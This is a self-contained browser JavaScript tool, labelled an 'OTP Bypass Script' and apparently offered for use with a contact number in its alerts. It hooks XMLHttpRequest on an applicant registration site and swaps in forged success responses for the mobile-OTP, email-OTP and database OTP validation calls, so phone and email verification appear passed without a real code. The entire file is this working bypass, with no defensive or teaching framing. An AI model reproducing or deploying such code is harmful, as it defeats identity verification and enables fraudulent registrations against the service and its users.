(function () {
  const notify = (msg) => alert(msg); // Alert instead of console.log

  notify("🧪 OTP Bypass Script Initialized by SV");

  const endpoints = [
    "/applicant-server/o/mql",
    "/server/o/mql",
  ];

  const fakeResponses = {
    ValidateMobileOTPForRegistration: () => ({
      ValidateMobileOTPForRegistration: {
        result: { OTPMobile: "OTPFOUND" },
        error: null,
        reponseHeader: null,
        errorCode: 0,
        debugInfo: {
          stackTrace: null,
          performanceInfo: null,
        },
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),

    ValidateEmailOTPForRegistration: () => ({
      ValidateEmailOTPForRegistration: {
        result: { emailOTP: "OTPFOUND" },
        error: null,
        reponseHeader: null,
        errorCode: 1000,
        debugInfo: {
          stackTrace: null,
          performanceInfo: null,
        },
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),

    dbPresentOTPValidate: () => ({
      dbPresentOTPValidate: {
        result: { user: "email@example.com" },
        error: null,
        reponseHeader: null,
        errorCode: 0,
        debugInfo: {
          stackTrace: null,
          performanceInfo: null,
        },
        isCompressed: false,
        serverTime: new Date().toISOString(),
      },
    }),
  };

  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    this._url = url;
    return originalOpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      if (typeof body === "string" && endpoints.some(ep => this._url.includes(ep))) {
        const matchedKey = Object.keys(fakeResponses).find((key) =>
          body.includes(key)
        );

        if (matchedKey) {
          const xhr = this;
          const fakeResponseText = JSON.stringify(fakeResponses[matchedKey]());

          // ✅ Alert on successful OTP interception
          notify(`✅ OTP Verified Successfully.\nThank you for using our tool.\nSV | Contact: 9921076909`);

          // Patch onreadystatechange to inject fake response
          const originalOnReadyStateChange = xhr.onreadystatechange;
          xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
              try {
                Object.defineProperty(xhr, "responseText", {
                  get: () => fakeResponseText,
                });
              } catch (e) {
                xhr.responseText = fakeResponseText;
              }
            }
            if (originalOnReadyStateChange) {
              return originalOnReadyStateChange.apply(this, arguments);
            }
          };
        }
      }
    } catch (err) {
      notify("🚫 Error during OTP bypass:\n" + err);
    }

    return originalSend.apply(this, arguments);
  };
})();
